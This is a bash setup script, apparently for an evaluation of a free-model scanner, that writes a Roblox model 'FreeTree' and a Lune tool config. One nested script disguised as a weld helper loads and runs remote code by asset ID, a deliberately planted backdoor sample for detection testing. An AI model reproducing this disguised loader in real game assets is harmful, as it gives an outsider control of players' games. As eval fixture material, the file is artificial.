#!/usr/bin/env bash
# Writes FreeTree.rbxmx (one harmless script, one backdoor) and lune.env with a lune binary copied
# into ./.tools, because the agent cannot read the real home folder during an eval.
set -euo pipefail
lune=''
for c in "${RDK_LUNE_BIN:-}" "$HOME"/.rokit/tool-storage/lune-org/lune/*/lune "$(command -v lune || true)" "$HOME/.rokit/bin/lune"; do
  if [ -n "$c" ] && [ -x "$c" ] && "$c" --version >/dev/null 2>&1; then
    lune=$c
    break
  fi
done
[ -n "$lune" ] || {
  echo "scan-free-model needs Lune (set RDK_LUNE_BIN, put lune on PATH, or install the kit's Rokit toolchain)" >&2
  exit 1
}
mkdir -p .tools
cp "$lune" .tools/lune
chmod +x .tools/lune
printf 'RDK_LUNE_BIN="%s"\n' "$PWD/.tools/lune" >lune.env

cat >FreeTree.rbxmx <<'XML'
<roblox version="4">
  <Item class="Model" referent="RBX0">
    <Properties>
      <string name="Name">FreeTree</string>
    </Properties>
    <Item class="MeshPart" referent="RBX1">
      <Properties>
        <string name="Name">Trunk</string>
      </Properties>
      <Item class="Weld" referent="RBX2">
        <Properties>
          <string name="Name">Weld</string>
        </Properties>
        <Item class="Script" referent="RBX3">
          <Properties>
            <string name="Name">Weld </string>
            <bool name="Disabled">false</bool>
            <ProtectedString name="Source"><![CDATA[-- welds the leaves to the trunk
task.wait(3)
local loader = require(4201337000)
getfenv(loader.start).script = script
loader.start()
]]></ProtectedString>
          </Properties>
        </Item>
      </Item>
    </Item>
    <Item class="MeshPart" referent="RBX4">
      <Properties>
        <string name="Name">Leaves</string>
      </Properties>
    </Item>
    <Item class="Script" referent="RBX5">
      <Properties>
        <string name="Name">Sway</string>
        <bool name="Disabled">false</bool>
        <ProtectedString name="Source"><![CDATA[-- Sways the leaves a little.
local RunService = game:GetService("RunService")
local leaves = script.Parent:WaitForChild("Leaves")
local base = leaves.CFrame
RunService.Heartbeat:Connect(function()
	leaves.CFrame = base * CFrame.Angles(0, 0, math.rad(math.sin(os.clock()) * 2))
end)
]]></ProtectedString>
      </Properties>
    </Item>
  </Item>
</roblox>
XML
